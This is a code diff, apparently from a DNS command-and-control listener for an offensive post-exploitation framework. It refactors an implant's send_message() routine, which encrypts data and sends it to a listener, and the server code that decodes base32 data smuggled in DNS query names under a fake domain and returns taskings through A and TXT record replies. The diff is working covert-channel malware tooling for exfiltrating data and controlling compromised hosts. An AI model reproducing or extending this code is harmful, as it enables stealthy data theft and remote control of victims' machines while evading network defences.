@@ -517,31 +517,32 @@ def send_message(packets=None):
 
     iprecv = ""
     data = None
-    print "[AGENT] in send_message()"
+    routingPacket = ""
 
     if packets:
+        print "[AGENT] in send_message() WITH packets to send"
         data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
-        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-        ip_recv=send_data_to_listener(taskinghostname, sock, host, port, data, fake_domain)
+        routingPacket = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
     else:
-        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
-        #   meta TASKING_REQUEST = 4
+        print "[AGENT] in send_message() WITHOUT packets to send"
+        # we have no packets to send, ask listener for new taskings
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        ip_recv=send_data_to_listener(taskinghostname, sock, host, port, routingPacket, fake_domain)
+
+    ip_recv=send_data_to_listener(taskinghostname, sock, host, port, routingPacket, fake_domain)
+
     try:
         print "[AGENT] main control loop"
         if ip_recv == ipnop:
-            print "standard NOP response"
+            print "[AGENT] standard NOP response"
         elif ip_recv == ipswitchatotxt:
-            # A record
-            print "recv A record response, switching to sending TXT request in order to recv agent command"
+            print "[AGENT] recv A record response, switching to sending TXT request in order to recv agent command"
             a=recv_data_from_listener(taskingtxthostname, sock, fake_domain, host, port)
             return ('200', a)
-
     except Exception as e:
         print e
+
     return ('', '')
 """
                 return updateServers + updatePort + updateIPNOP + updateIPSwitchAtoTXT + sendMessage
@@ -622,13 +623,6 @@ def send_message(packets=None):
     def process_tasking_txt(self, hostname, sock, payload, addr, ipack, txtstoptransfer, reply_id, reply_qd):
         self.send_txt_record_reply_id_test(sock, hostname, ipack, addr, reply_id, reply_qd)
         
-        # txt_request, txt_addr = sock.recvfrom(512)
-        # txt_dns = DNS(txt_request)
-        # txt_host = str(txt_dns[DNSQR].qname)
-        # txt_reply_id = txt_dns.id
-        # txt_reply_qd = txt_dns.qd
-
-        #self.send_payload_via_txt(txt_host, sock, payload, txt_addr, txtstoptransfer, txt_reply_id, txt_reply_qd)
         self.send_payload_via_txt_test(sock, payload, txtstoptransfer)
         
     def stop_data_transfer(self, sock, host, port, txtstoptransfer, hostname, reply_id):
@@ -742,25 +736,27 @@ def send_message(packets=None):
         self.send_a_record_reply_id(sock, recv_hostname, ipack, addr, reply_id, reply_qd)
 
         a_base32 = ""
+        dataResults = ""
+        
         while True:
             data,server_dns=sock.recvfrom(512)
             a_dns = DNS(data)
-            print "[PROCESS] recv hostname {}".format(a_dns[DNSQR].qname.decode('ascii'))
+            #print "[PROCESS] recv hostname {}".format(a_dns[DNSQR].qname.decode('ascii'))
             a_host = a_dns[DNSQR].qname.decode('ascii')
             if self.is_eof_response(a_dns):
-                print "[PROCESS] BREAKING"
+                #print "[PROCESS] BREAKING"
                 break
             a_host = a_host.replace('.' + fake_domain, "")
             a_array = a_host.split('.')
             # remove prefix + suffix
             del a_array[0]
             del a_array[-1:]
-            print "[PROCESS] a_array {}".format(a_array)
-            print "[PROCESS] a_array len {}".format(len(a_array))
+            #print "[PROCESS] a_array {}".format(a_array)
+            #print "[PROCESS] a_array len {}".format(len(a_array))
             if len(a_array) == 1:
                 a_base32 = a_base32+a_array[0]
             elif len(a_array) == 2:
-                print "[PROCESS] concat a_array 0 {} + a_array 1 {}".format(a_array[0], a_array[1])
+                #print "[PROCESS] concat a_array 0 {} + a_array 1 {}".format(a_array[0], a_array[1])
                 a_base32 = a_base32 + a_array[0] + a_array[1]
             self.send_a_record_reply_id(sock, a_host, ipack, server_dns, a_dns.id, a_dns.qd)
         print "[PROCESS] About to decode {}".format(a_base32)
@@ -769,6 +765,7 @@ def send_message(packets=None):
 
         if dataResults and len(dataResults) > 0:
             for (language, results) in dataResults:
+                # FIXME do we get more than one "results" here? What does the original code do?
                 if results:
                     print "[PROCESS] Taskings exists for agent, sending reply to host {} with ipaddr {} to IP address {} port {}".format(a_host, ipswitchatotxt, server_dns[0], server_dns[1])
                     self.send_a_record_reply_id(sock, a_host, ipswitchatotxt, server_dns, a_dns.id, a_dns.qd)
